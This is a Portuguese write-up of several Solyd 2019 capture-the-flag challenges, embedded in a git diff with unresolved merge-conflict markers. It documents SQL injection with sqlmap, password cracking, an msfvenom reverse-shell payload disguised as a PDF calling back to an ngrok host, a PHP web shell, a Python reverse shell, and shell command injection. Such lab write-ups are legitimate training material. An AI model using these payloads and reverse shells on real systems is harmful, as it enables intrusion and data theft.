@@ -1,0 +1,1048 @@
+CTF 2019 – Solyd (Write-up)
+1. Começando suas aventuras
+Flag 1 – Acesso via FTP anônimo
+
+Durante a enumeração inicial foi realizado um scan com Nmap, onde foi identificada a porta 21 (FTP) aberta.
+
+Foi possível realizar login utilizando o usuário anonymous sem senha.
+
+ftp 3.219.234.210
+Conexão FTP
+Connected to 3.219.234.210.
+220 (vsFTPd 3.0.3)
+
+Name: anonymous
+Password:
+
+230 Login successful.
+
+Após ativar o modo passivo e listar os diretórios:
+
+ls -la
+
+Foi encontrado o diretório:
+
+Comunicados
+
+Ao acessar o diretório e listar os arquivos:
+
+cd Comunicados
+ls -la
+
+Foi identificado um arquivo oculto:
+
+.aviso!
+
+Download do arquivo:
+
+get .aviso!
+
+Conteúdo do arquivo:
+
+Quem foi que colocou aquele site wordpress no ar?
+
+Minha equipe fez apenas alguns posts e instalou pouquissimos plugins.
+Ele ainda esta longe do 100%, por favor retira-lo o quanto antes.
+Flag 1
+Solyd{c4r3ful_w1th_an0nym0us_ftp}
+Flag 2 – Exploração de plugin WordPress
+
+Após enumeração de diretórios no servidor web foi identificado um diretório:
+
+/wordpress
+
+Foi executado um scan utilizando WPScan, que identificou o plugin vulnerável:
+
+simply-poll
+version: 1.4.1
+
+Na base de dados do Exploit-DB foi identificado que esse plugin possui vulnerabilidades:
+
+XSS
+
+SQL Injection
+
+Foi utilizada a exploração de SQL Injection.
+
+Comando sugerido no Exploit-DB
+sqlmap -u "http://example.com/wp-admin/admin-ajax.php"
+--data="action=spAjaxResults&pollid=2"
+--dump -T wp_users -D wordpress
+--threads=10 --random-agent --dbms=mysql --level=5 --risk=3
+Comando utilizado no ataque
+sqlmap -u "http://3.219.234.210/wp-admin/admin-ajax.php"
+--data="action=spAjaxResults&pollid=2"
+--threads=10 --random-agent --dbms=mysql --batch --dbs
+
+Foi identificado o banco de dados:
+
+rookie
+
+Listagem de tabelas:
+
+sqlmap -u "http://3.219.234.210/wp-admin/admin-ajax.php" \
+--data="action=spAjaxResults&pollid=2" \
+--threads=10 --random-agent --dbms=mysql --batch \
+-D rookie --tables
+
+Foi encontrada a tabela:
+
+wp_users
+
+Dump da tabela:
+
+sqlmap -u "http://3.219.234.210/wp-admin/admin-ajax.php" \
+--data="action=spAjaxResults&pollid=2" \
+--threads=10 --random-agent --dbms=mysql --batch \
+-D rookie -T wp_users --dump
+
+O dump revelou:
+
+usuários do WordPress
+
+hashes de senha
+
+segunda flag
+
+Flag 2
+Solyd{w34k_plug1ns_3v3rywher3}
+Flag 3 – Quebra de hash e acesso SSH
+
+Ao acessar o site:
+
+http://3.219.234.210/wordpress
+
+Foi possível identificar que o usuário estagiario fazia posts com privilégios de administrador.
+
+No banco de dados obtido via SQL Injection também foi encontrada a hash desse usuário.
+
+A hash foi salva em um arquivo:
+
+hash.txt
+
+Quebra da hash utilizando John the Ripper:
+
+john hash.txt --wordlist=rockyou.txt
+
+⚠️ Observação: a wordlist rockyou precisa estar descompactada.
+
+Senha descoberta:
+
+tiktok
+
+Também foi identificado via Nmap que a porta 22 (SSH) estava aberta.
+
+Login SSH:
+
+ssh estagiario@3.219.234.210
+
+Senha:
+
+tiktok
+
+Após login:
+
+ls -la
+
+Foi encontrado o arquivo:
+
+flag3
+Flag 3
+Solyd{f0ll0w_th3_p4ssw0rd_rul3s}
+Flag 4 – Escalação de privilégios
+
+Dentro do SSH foi encontrado o arquivo:
+
+Politicas_de_senhas
+
+O arquivo mencionava um usuário chamado carlos, chefe da TI.
+
+Foi analisado o histórico de comandos do usuário:
+
+cat .bash_history
+
+No histórico foi possível observar:
+
+criação de um script chamado backup.sh
+
+envio de arquivos utilizando nc
+
+criação de um arquivo:
+
+Trabalho_Estagiario.zip
+
+Também foi identificado um diretório:
+
+flag4
+
+Porém sem permissão de acesso.
+
+Análise do script backup.sh
+
+Dentro da home do usuário foi encontrado o script:
+
+backup.sh
+
+Conteúdo:
+
+#!/bin/bash
+
+cp -R /root /var/backups
+cp -R /etc /var/backups/root
+zip -P estagiario -r Trabalho_Estagiario.zip /var/backups/root && mv Trabalho_Estagiario.zip /var/backups
+sudo chmod -R ugo+rw /var/backups/Trabalho_Estagiario.zip
+sudo chmod -R estagiario /var/backups/Trabalho_Estagiario.zip
+rm -r /var/backups/root
+
+Observações importantes:
+
+O ZIP possui senha estagiario
+
+O arquivo recebe permissões amplas
+
+Contém backup de:
+
+/root
+/etc
+Extração do backup
+
+Foi acessado o diretório:
+
+/var/backups
+
+Localizando o arquivo:
+
+Trabalho_Estagiario.zip
+
+Extração do arquivo:
+
+unzip Trabalho_Estagiario.zip
+
+Senha:
+
+estagiario
+
+Dentro do ZIP foi encontrada uma cópia de:
+
+/etc
+/root
+
+Isso permitiu acessar arquivos sensíveis como:
+
+/etc/shadow
+
+e também a pasta:
+
+/root/.ssh
+
+Dentro dela havia uma chave RSA privada.
+
+Escalação para root
+
+Utilizando a chave encontrada:
+
+ssh root@127.0.0.1 -i rsa
+
+A autenticação foi realizada com sucesso.
+
+Após acessar o sistema como root, foi possível entrar no diretório:
+
+flag4
+
+Listando os arquivos:
+
+ls -la
+Flag 4
+Solyd{0wn3d_th3_bug_b0unty_pr0gr4m}
+
+CTF 2019 – Solyd
+Desafio 2: Cracker ou Hacker
+Flag 1 – FTP Anônimo
+
+A exploração iniciou com um scan de portas usando Nmap, onde foi identificada a porta 21 (FTP) aberta.
+
+Tentamos autenticação com o usuário:
+
+anonymous
+
+Sem senha.
+
+Após o login, foi ativado o modo passivo usando:
+
+pass
+
+Depois foi feita a listagem de arquivos:
+
+ls -la
+
+Resultado:
+
+-rw-rw-r--    1 0        0              32 Dec 16  2018 flag.txt
+-rw-rw-r--    1 0        0             227 Dec 16  2018 readme.txt
+
+Download dos arquivos:
+
+get readme.txt
+get flag.txt
+
+Depois disso, foi feita a leitura da flag:
+
+cat flag.txt
+
+Resultado:
+
+Flag1: Solyd{p4ss1v3_4n0nym0us}
+Flag 2 – Programação com Sockets
+
+Ao abrir o arquivo readme.txt, encontramos a seguinte mensagem:
+
+Seu próximo desafio irá requerir conhecimento de programação em sockets.
+Você irá receber uma matriz 3x3 com caracteres aleatórios e números.
+Some todos os números dessa matriz para conseguir a flag.
+
+A dica da plataforma dizia:
+
+“Lembre-se de bater em todas as portas.”
+
+Então foi realizado um scan em portas altas:
+
+nmap 3.222.207.113 -p 50000-51000
+
+Resultado:
+
+PORT      STATE SERVICE
+50123/tcp open  unknown
+
+Conectando na porta com netcat:
+
+nc 3.222.207.113 50123
+
+Resposta recebida:
+
+SzZ1709qs2289938q
+Q6651G}.w6209+;wJ9380W+fxS
+Iu$25715835BoBuCy|]*{6007(.qpq
+
+A resposta continha números misturados com caracteres, representando a matriz.
+
+Para resolver automaticamente foi criado um script em Python.
+
+Script em Python
+import socket
+import re
+
+ip = "3.222.207.113"
+port = 50123
+soma = 0
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+
+data = s.recv(1024).decode()
+
+numberlist = re.findall(r"\d+", data)
+
+print(numberlist)
+
+for numero in numberlist:
+    soma += int(numero)
+
+s.send(str(soma).encode())
+
+print(s.recv(1024).decode())
+
+Executando o script:
+
+python3 matriz.py
+
+Resultado:
+
+['6491', '6330', '4724', '2825', '4592', '1572', '236', '1445', '1615']
+
+Flag: Solyd{m4tr1x_s0ck3t}
+Flag 3 – Esteganografia e Forense
+
+Voltando ao FTP, foi encontrada a pasta:
+
+logs
+
+Dentro dela havia o arquivo:
+
+dados.log
+
+Para identificar o tipo do arquivo foi usado:
+
+file dados.log
+
+Resultado:
+
+dados.log: JPEG image data
+
+Ou seja, o arquivo era na verdade uma imagem JPEG.
+
+Foi criada uma cópia renomeando o arquivo:
+
+cp dados.log dados.jpg
+
+Após isso foi executado:
+
+strings dados.log
+
+Entre os resultados foi possível identificar o seguinte trecho:
+
+WAVEfmt
+
+Esse trecho indica o header de um arquivo WAV, ou seja, havia um áudio escondido dentro da imagem.
+
+Extração do áudio
+
+Foi utilizado um editor hexadecimal (Bless).
+
+Passos:
+
+Abrir o arquivo dados.jpg
+
+Procurar pelo final do JPEG:
+
+FF D9
+
+Após esse ponto começa o arquivo de áudio
+
+O conteúdo após esse header foi extraído e salvo como:
+
+som.wav
+Análise do áudio
+
+O áudio foi aberto em um software de edição de som e analisado com espectrograma.
+
+Ao aplicar zoom no espectro foi encontrado o texto:
+
+solyd.forense
+
+Esse texto era uma senha para esteganografia na imagem.
+
+Extração com Steghide
+
+Foi executado:
+
+steghide extract -sf dados.jpg -p solyd.forense
+
+Isso revelou um arquivo:
+
+license.zip
+
+Extraindo o ZIP:
+
+unzip license.zip
+
+Dentro dele estava a terceira flag:
+
+Solyd{m4g1c_numb3rs_4nd_sp3ctr0gr4m}
+Flag 4 – Engenharia Reversa
+
+Dentro do ZIP também foi encontrado um arquivo binário:
+
+license.bin
+
+Primeiro foi executado:
+
+strings license.bin
+
+Mas não foi possível encontrar a flag diretamente.
+
+Então foi utilizado:
+
+ltrace ./license.bin
+
+Resultado:
+
+Usage: <user> <key>
+
+Ou seja, o binário espera dois parâmetros:
+
+<user> <key>
+Engenharia reversa
+
+Foi utilizada análise com:
+
+GDB
+
+plugin PEDA
+
+Durante a análise do assembly foi identificado um jump condicional responsável por validar a chave.
+
+Comando para analisar o binário:
+
+objdump -d -M intel license.bin
+
+Foi encontrado um salto condicional:
+
+75
+
+Esse opcode representa:
+
+JNE (Jump if Not Equal)
+
+Alterando para:
+
+74
+
+Ele se torna:
+
+JE (Jump if Equal)
+
+Ou seja, forçamos a condição a sempre ser válida.
+
+Patch do binário
+
+Utilizando o editor hexadecimal Bless:
+
+Abrir license.bin
+
+Ir até o endereço do opcode
+
+Alterar:
+
+75 → 74
+
+Salvar o binário modificado.
+
+Recuperação da flag
+
+Executando novamente com ltrace:
+
+ltrace ./license.bin user key
+
+Foi possível observar a flag nas chamadas internas:
+
+Solyd{3ng3n33r1ng_r3v3rs3d}
+
+Observação: também seria possível recuperar a flag usando:
+
+strings -n 1 license.bin
+
+E reconstruindo manualmente os caracteres.
+<<<<<<< HEAD
+=======
+
+
+CTF 2019 – Solyd
+Desafio 3: Desenvolvimento GoHorsa
+Flag 1 – Upload malicioso e Reverse Shell
+
+A exploração iniciou com um scan utilizando Nmap para identificar serviços ativos e tentar descobrir o sistema operacional.
+
+Comando utilizado:
+
+nmap 13.220.23.173 -O
+
+Resultado:
+
+PORT     STATE    SERVICE
+25/tcp   filtered smtp
+8080/tcp open     http-proxy
+
+Foi identificado apenas um serviço web na porta 8080.
+
+Análise da aplicação web
+
+Ao acessar o site foram encontrados:
+
+página de registro
+
+página de login
+
+página de recrutamento
+
+Na página de recrutamento era possível enviar um currículo em PDF.
+
+Isso indicava uma possível vulnerabilidade de upload de arquivos.
+
+A estratégia foi enviar um arquivo malicioso disfarçado de PDF contendo uma reverse shell.
+
+Criação do payload
+
+Foi utilizado msfvenom para gerar um payload Linux.
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.tcp.sa.ngrok.io LPORT=14520 -f elf > shell.pdf
+
+Observação: o arquivo foi nomeado como PDF, mas na verdade é um executável ELF.
+
+Listener no Metasploit
+
+Foi iniciado um listener com Metasploit.
+
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+exploit
+
+Após o upload do arquivo malicioso na aplicação web, foi recebida uma conexão reversa.
+
+Resultado:
+
+Meterpreter session 1 opened
+Acesso ao sistema
+
+Foi obtido acesso ao shell:
+
+meterpreter > shell
+
+Listando arquivos:
+
+ls -la
+
+Resultado:
+
+reverse_2026-03-09_01_56
+reverse_2026-03-09_01_57
+reverse_2026-03-09_02_03
+reverse_2026-03-09_02_05
+
+Melhorando a shell:
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+Dentro da shell foi encontrada a primeira flag:
+
+Solyd{34sy_p34sy}
+Flag 2 – Quebra de hash
+
+Já dentro da máquina foi tentado acessar o arquivo:
+
+/etc/shadow
+
+Comando:
+
+cat /etc/shadow
+
+Foi possível visualizar as hashes dos usuários, incluindo:
+
+github:$6$hfGGddWa$...
+Identificação dos usuários
+
+Arquivo analisado:
+
+cat /etc/passwd
+
+Usuários relevantes:
+
+github:x:1000:1000:/home/github:/bin/bash
+exploited:x:1001:1001:/home/exploited:/bin/bash
+Preparação da hash
+
+Foi utilizado unshadow para preparar o arquivo de cracking.
+
+Depois foi isolada a hash do usuário github.
+
+Quebra da senha
+
+Foi utilizado John the Ripper com a wordlist rockyou.
+
+john hash.txt --wordlist=rockyou.txt
+
+Resultado:
+
+456456456 (github)
+
+Senha descoberta:
+
+456456456
+Escalada de usuário
+
+Dentro da shell:
+
+su github
+
+Senha:
+
+456456456
+
+Após o login, foi exibida a segunda flag:
+
+Solyd{Brut3_F0rc3_t0P}
+Flag 3 – Análise de APK
+
+Dentro da home do usuário github foi encontrado o diretório:
+
+insecure-apk
+
+Listagem:
+
+ls -la
+
+Resultado:
+
+drwxrwx--- insecure-apk
+
+Dentro do diretório havia:
+
+um arquivo README
+
+um arquivo APK
+
+Decompilação do APK
+
+O APK foi baixado e analisado utilizando um decompilador de APK online.
+
+Durante a análise do código fonte foi encontrado o seguinte trecho:
+
+public static final String[] DUMMY_CREDENTIALS = {
+    "admin@fake.com:D2xk5PRS112keUcL"
+};
+
+Ou seja, o aplicativo continha credenciais hardcoded.
+
+Credenciais encontradas:
+
+admin@fake.com
+D2xk5PRS112keUcL
+Login na aplicação
+
+Utilizando essas credenciais no site foi possível realizar login.
+
+Após o login, o sistema revelou a terceira flag:
+
+Solyd{J4v4_T0P}
+
+
+
+CTF solyd 2019
+Desafio 4:
+Hacker Rock Story
+no iniciamos o ataque fazendo um reconechimento com o nmap que nos retornou o seguinte:
+nmap 44.199.236.83          
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 16:16 -0400
+Nmap scan report for ec2-44-199-236-83.compute-1.amazonaws.com (44.199.236.83)
+Host is up (0.14s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+25/tcp   filtered smtp
+5000/tcp open     upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds
+
+sem saber o que e na porta 5000 usamos o Netcat para vê o se descobrimos algos:
+e o resultado foi:
+
+nc  44.199.236.83 5000          
+
+Bem vindo ao desafio! Esse desafio se trata de um trabalho universitario envolvendo processamento de imagens onde queremos mostrar novas formas de enviar QR Codes pela internet. Envie "Ok" Para comecar o desafio.
+
+
+
+com isso nós criamos um script em python que envia o ok pra nos e assim com toda a configuração de bytes e rbg nos recriamos a imagem e depos fazemos um decode dela
+e assim apaereceu a flag
+import socket, time
+from PIL import Image, ImageOps
+from pyzbar import pyzbar
+
+ip = "172.18.4.3"
+port = 5000
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+
+print(s.recv(1024).decode())
+s.send(b"ok")
+
+while 1:
+    time.sleep(0.5)
+
+    data = s.recv(100000).decode()
+    data = data.replace(" ", "").split(";")
+
+    qrcode = Image.new("RGB", (len(data), len(data)))
+    data.pop()
+
+    for i in range(len(data)):
+        data[i] = data[i].split(",(")
+        for j in range(len(data)):
+            data[i][j] = tuple(
+                map(int, data[i][j].replace("(", "").replace(")", "").split(","))
+            )
+            pixel = data[i][j]
+            qrcode.putpixel((i, j), pixel)
+
+    qrcode = ImageOps.expand(qrcode, border=3, fill="white")
+    s.send(pyzbar.decode(qrcode)[0][0])
+Solyd{4s_C0iS4s_L4m3nTam_}
+
+>>>>>>> 53b1b739576e517a31b276009d059279c20574b9
+<<<<<<< HEAD
+=======
+
+
+
+
+
+CTF Solyd 2019 – Desafio 5 (Sherlock vs Moriarty)
+1️⃣ Enumeração inicial
+
+Primeiro passo foi a varredura de portas.
+
+nmap 3.235.124.225
+
+Resultado:
+
+Porta	Serviço
+22	SSH
+25	SMTP (filtered)
+80	HTTP
+139	NetBIOS
+445	SMB
+
+Isso indica três possíveis vetores principais:
+
+Web (porta 80)
+
+SMB (139 / 445)
+
+SSH (22)
+
+2️⃣ Enumeração Web
+
+O site inicialmente não mostrava nada relevante.
+
+Então foi feito bruteforce de diretórios.
+
+Ferramenta usada:
+
+dirb
+
+Durante a enumeração foi encontrado:
+
+/backup.txt
+
+Conteúdo:
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+if ($username!="SHeRLock" || $password!="H0LmeS@!01") {
+
+Credenciais descobertas:
+
+SHeRLock : H0LmeS@!01
+Problema encontrado
+
+Mesmo com a senha correta não era possível logar.
+
+Ao analisar a requisição percebeu-se que o formulário alterava o case das letras.
+
+Solução:
+
+Interceptar a requisição usando:
+
+Burp Suite
+
+Modificar manualmente os valores.
+
+Após o envio correto ocorreu redirecionamento para:
+
+credenciais.txt
+
+Conteúdo:
+
+moriarty:#m0ri4rty#
+🚩 Flag 1
+Solyd{f0und_s0m3_h1dd3n_f1l3s}
+3️⃣ Enumeração SMB
+
+Nova varredura:
+
+nmap -A 3.235.124.225
+
+Foi detectado:
+
+Samba
+
+Listando compartilhamentos:
+
+smbclient -L 3.235.124.225
+
+Resultado:
+
+Website
+
+Acesso com credenciais descobertas:
+
+smbclient //3.235.124.225/Website -U moriarty
+
+Arquivos encontrados:
+
+index.php
+login
+validacao.php
+backup.txt
+credenciais.txt
+4️⃣ Upload de Webshell
+
+Foi feito upload de uma shell PHP:
+
+<?php echo(system($_GET['cmd']))?>
+
+Upload:
+
+put shellsherlock.php
+
+Execução via navegador:
+
+http://IP/shellsherlock.php?cmd=id
+5️⃣ Reverse Shell
+
+Criada usando Python:
+
+python3 -c 'import socket,os,pty;
+s=socket.socket();
+s.connect(("NGROK",PORT));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+pty.spawn("/bin/bash")'
+
+Listener:
+
+nc -lvnp PORT
+6️⃣ Estabilizando shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+7️⃣ Flag 2
+
+No diretório root do container:
+
+/flag2
+
+Conteúdo:
+
+Solyd{g0t_th3_r3v_sh3ll}
+8️⃣ Enumeração local
+
+Arquivos interessantes:
+
+.senha
+Professor_Moriarty
+
+Senha encontrada:
+
+chefeMoriarty
+
+O arquivo Professor_Moriarty era uma imagem.
+
+9️⃣ Steganografia
+
+Ferramenta usada:
+
+Steghide
+
+Extração:
+
+steghide extract -sf Professor_Moriarty
+
+Senha:
+
+chefeMoriarty
+
+Arquivo extraído:
+
+ssh.txt
+
+Conteúdo:
+
+moriarty:Mor14rty#@
+🔟 Acesso SSH
+
+Conexão:
+
+ssh moriarty@IP
+🚩 Flag 3
+Solyd{s4w_thr0ugh_th4t_st3g0}
+1️⃣1️⃣ Escalada de privilégio
+
+Verificando sudo:
+
+sudo -l
+
+Resultado:
+
+(ALL) ALL
+(root) NOPASSWD: /home/moriarty/moriarty.rb
+
+Ou seja:
+
+moriarty pode executar qualquer comando como root
+
+Então basta:
+
+sudo -s
+
+ou
+
+sudo bash
+
+Agora:
+
+whoami
+root
+1️⃣2️⃣ Flag final
+
+Arquivo:
+
+/home/moriarty/flag4
+
+Conteúdo:
+
+Solyd{f0ll0w_th3_r1ght_p4th}
+
+
+
+CTF 2019 solyd 
+desafio: vortex
+
+Um arquivo foi vazado da empresa vortex e ela quer que você faça um pentest em seus sistemas para ver o quanto aquele arquivo vazado pode comprometer a empresa.
+
+Download do arquivo
+
+1 flag:
+e um arquivo de rede usado no wirewhasrk a onde la dentreo vemos uma requisção http então vamos em export object selecionamos http e extraimos um zip aonde ele contem senha
+pra quebra esse senha usamos o john com 
+
+john hash_zip.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+ele extraiu uma foto srenchot.png e um arquivo flag.txt 
+depois so dar um cat no arquivo 
+cat flag.txt            
+Solyd{3xtract3d_from_pc4p}
+
+e temos nos primeira flag
+
+
+pra segunda flag olhamos imagem e nela vemos um texto então nos pegamos a imagem e jogamos no chat gpt pedindo pra ele trasncrever oq eu esta na imagem.
+e esse e o resultado:
+--> IBEGRK
+
+Rfgn bcrençãb dhr verzbf snmre veá raibvire gbqb b pbagvaragr fhy-nzrevpnab r aóf cerpvfnzbf qb ncbvb qr abffbf vairfgvqberf cnen gbeane vffb cbffíry.
+Znagre gbqbf rffrf qnqbf frthebf qr crffbnf gãb vzcbegnagrf é ernyzragr hz qrfnsvb cnen gbqbf rfgá pbagen aóf, ragãb cerpvfnzbf qb zákvzb qr erphefbf cbffírvf, Rfgnerv qr ivntrz abf crókvzbf geêf qvnf znf aãb cbqrzbf cnene, rfgnerv qrvknaqb b Eboregb rapneertnqb qr zbavgbene abffb fvgr radhnagb rfgnerv sben.B ybtva cnen dhnydhre shapvbaáevb é shapibegrk r n fraun é ibegrkqnqbffrthebf.
+Cbe snibe pbaqhmnz orz gbqn rffn bcrençãb dhr freá sngny cnen n rzcerfn. fr snyunezbf cbqrerzbf srpune abffnf cbegnf. Fhn synt rnflebgpvcure, yrzoerfr qr pbypne ab sbezngb.
+Qrirzbf svpne ngragbf n gbqbf, cryb zrabf gbqbf abffbf nedhvibf qr grkgb fãb pevcgbtensnqbf pbz hzn punir zhvgb frthen. ragãb rfgnzbf orz.
+
+
+--> VORTEX
+
+Esta operação que iremos fazer irá envoiver todo o continente sul-americano e nós precisamos do apoio de nossos investidores para tornar isso possíel.
+Manter todos esses dados seguros de pessoas tão importantes é realmente um desafio para todos está contra nós, então precisamos do máximo de recursos possíeis, Estarei de viagem nos peóximos três dias mas não podemos parar, estarei deixando o Roberto encarregado de monitorar nosso site enquanto estarei fora.O login para qualquer funcionário é funcvortex e a senha é vortexdadosseguros.
+Por favor conduzam bem toda essa operação que será fatal para a empresa. se falharmos poderemos fechar nossas portas. Sua flag easyrotcipher, lembrese de colcar no formato.
+Devemos ficar atentos a todos, pelo menos todos nossos arquivos de texto são criptografados com uma chave muito segura. então estamos bem.
+
+então ao descriptpgrafa conseguimos a flag easyrotcipher que e so colcoar no formato da plataforma Solyd{easyrotcipher}
+e conseguimos um usuario e senha.
+
+aos isso fazemos um nmap no ip e temos a porta 22 aberta mas os usuario não dao nela mas tem uma porta 8080 que ao conectar nela aparece uma painel de login.
+apos fazer o login ele parece uma tela pra gente fazer um host de um ip então se gente coloca qualquer ip nele. ele vai dar um ping e nos mostra o log
+mas tem uma vulnerabilidade nisso se ness mesmo local nos colocarmos | e algum comando ele executa
+então se a gente colocar | ls e excutar ele nos tras os dados e trouxe um arquivo chamado de .flag depois e so dar o comando | cat .flag e ele nos retorna com a nossa flag
+
+Array (     [0] => Solyd{c0mm4nd_1nj3ct10n_4tw} )
+>>>>>>> 180e99b1639cfbae76aab14e5f01c5b88575362f
